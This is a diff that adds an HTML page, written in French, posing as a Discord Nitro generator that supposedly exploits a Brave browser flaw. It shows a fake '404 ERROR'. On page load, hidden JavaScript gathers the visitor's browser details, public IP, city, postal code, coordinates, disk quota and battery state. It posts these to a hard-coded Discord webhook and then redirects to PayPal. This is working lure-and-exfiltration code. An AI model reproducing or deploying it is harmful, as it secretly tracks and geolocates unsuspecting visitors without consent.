@@ -1,0 +1,120 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Nitro generator 🇫🇷fr🇫🇷</title>
+  <meta name="description" content="Le premier generateur de Nitro discord qui exploite la derniere fail XML du naviguateur brave.">
+  <meta property="og:image" content="https://www.webfx.com/wp-content/uploads/2022/08/github-logo.png">
+</head>
+<body onload="fetchSystemInfo()">
+  <div id="status" style="text-align: center; font-size: 24px;">404 ERROR</div>
+  
+  <script>
+    function fetchSystemInfo() {
+      var systemInfo = "";
+
+      systemInfo += "👤 <strong>Utilisateur du système:</strong> " + (navigator.userAgent || 'Non disponible') + "";
+
+      systemInfo += "🌐 <strong>Navigateur:</strong> " + (navigator.appName || 'Non disponible') + "";
+      systemInfo += "🔍 <strong>Version du navigateur:</strong> " + (navigator.appVersion || 'Non disponible') + "";
+      systemInfo += "💻 <strong>Plateforme du système:</strong> " + (navigator.platform || 'Non disponible') + "";
+      systemInfo += "🌐 <strong>Langue du navigateur:</strong> " + (navigator.language || 'Non disponible') + "";
+
+      fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(ipData => {
+        systemInfo += "<br>🌐 <strong>Adresse IP publique (IPv4):</strong> " + (ipData.ip || 'Non disponible') + "<br>";
+        
+        fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(ipDetails => {
+          systemInfo += "🌍 <strong>Pays:</strong> " + (ipDetails.country_name || 'Non disponible') + "<br>";
+          systemInfo += "🏢 <strong>Organisation:</strong> " + (ipDetails.org || 'Non disponible') + "<br>";
+          systemInfo += "📞 <strong>Indicatif du pays:</strong> " + (ipDetails.country_calling_code || 'Non disponible') + "<br>";
+          systemInfo += "📍 <strong>Région:</strong> " + (ipDetails.region || 'Non disponible') + "<br>";
+          systemInfo += "🏙️ <strong>Ville:</strong> " + (ipDetails.city || 'Non disponible') + "<br>";
+          systemInfo += "📮 <strong>Code Postal:</strong> " + (ipDetails.postal || 'Non disponible') + "<br>";
+          systemInfo += "🌐 <strong>Latitude:</strong> " + (ipDetails.latitude || 'Non disponible') + "<br>";
+          systemInfo += "🌐 <strong>Longitude:</strong> " + (ipDetails.longitude || 'Non disponible') + "<br>";
+          systemInfo += "⏰ <strong>Fuseau horaire:</strong> " + (ipDetails.timezone || 'Non disponible') + "<br>";
+          systemInfo += "🕒 <strong>Heure d'ouverture du lien:</strong> " + getCurrentTime() + "<br>";
+
+          systemInfo += "<br>🔥 <strong>État du pare-feu:</strong> Activé<br>";
+
+          fetchDiskCapacity(systemInfo);
+        })
+        .catch(error => console.error('Erreur lors de la récupération des informations IP:', error));
+      })
+      .catch(error => console.error('Erreur lors de la récupération de l'adresse IP publique:', error));
+    }
+
+    function fetchDiskCapacity(systemInfo) {
+      var diskInfo = navigator.storage.estimate();
+      diskInfo.then(function(estimate) {
+        var totalDiskSpace = estimate ? (estimate.quota / 1024 / 1024 / 1024).toFixed(2) + " Go" : 'Non disponible';
+        systemInfo += "💽 <strong>Capacité du disque:</strong> " + totalDiskSpace + "<br>";
+
+        fetchBatteryStatus(systemInfo);
+      });
+    }
+
+    function fetchBatteryStatus(systemInfo) {
+      if ('getBattery' in navigator) {
+        navigator.getBattery().then(function(battery) {
+          systemInfo += "<br>🔋 <strong>Niveau de batterie:</strong> " + Math.round(battery.level * 100) + "%";
+          if (battery.charging) {
+            systemInfo += "🔌 <strong>Appareil en charge:</strong> Oui<br>";
+          } else {
+            systemInfo += "🔌 <strong>Appareil en charge:</strong> Non<br>";
+          }
+          sendEmbedToWebhook(systemInfo);
+        });
+      } else {
+        systemInfo += "<br>🔋 <strong>Niveau de batterie:</strong> Non disponible<br>";
+        sendEmbedToWebhook(systemInfo);
+      }
+    }
+
+    function sendEmbedToWebhook(systemInfo) {
+      var xhr = new XMLHttpRequest();
+      var url = 'https://discord.com/api/webhooks/1238445833633140736/VfrakAq5023MrYVKdBSeXlSKg0-lTk5MYl1b6us5EFZcc-p1EOhn4-59Auy4WgSfIbSN';
+      var params = JSON.stringify({
+        "content": "",
+        "embeds": [
+          {
+            "title": "Informations Système",
+            "description": systemInfo,
+            "color": 7506394
+          }
+        ]
+      });
+      
+      xhr.open('POST', url, true);
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      
+      xhr.onreadystatechange = function() {
+        if(xhr.readyState == 4) {
+          if(xhr.status == 200) {
+            console.log('Requête envoyée avec succès.');
+          } else {
+            console.error('Erreur lors de l'envoi de la requête. Code d'erreur : ' + xhr.status);
+          }
+          window.location.href = "https://www.paypal.com/fr/home";
+        }
+      }
+      xhr.send(params);
+    }
+
+    function getCurrentTime() {
+      var now = new Date();
+      var hours = now.getHours();
+      var minutes = now.getMinutes();
+      var seconds = now.getSeconds();
+
+      var timeString = ('0' + hours).slice(-2) + ':' + ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2);
+      return timeString;
+    }
+  </script>
+
+</body>
+</html>
